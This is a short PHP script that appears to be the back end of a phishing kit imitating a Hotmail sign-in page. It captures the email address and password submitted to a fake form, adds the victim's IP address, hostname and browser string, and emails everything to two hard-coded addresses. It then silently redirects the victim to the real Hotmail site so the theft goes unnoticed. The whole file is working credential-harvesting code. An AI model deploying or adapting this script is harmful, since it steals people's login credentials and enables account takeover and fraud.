<?php
if($_POST["email"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "|----------| HOTMAIL  |--------------|\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "pass: ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- FUDTOOL [.] RU --------------|\n";
$send = "mallerst1@gmail.com, jamescooker@mynet.com";
$subject = "HOTMAIL | $ip";
{
mail("$send", "$subject", $message);   
}
  header ("Location: https://hotmail.com");
}else{
header ("Location: LL1.htm");
}

?>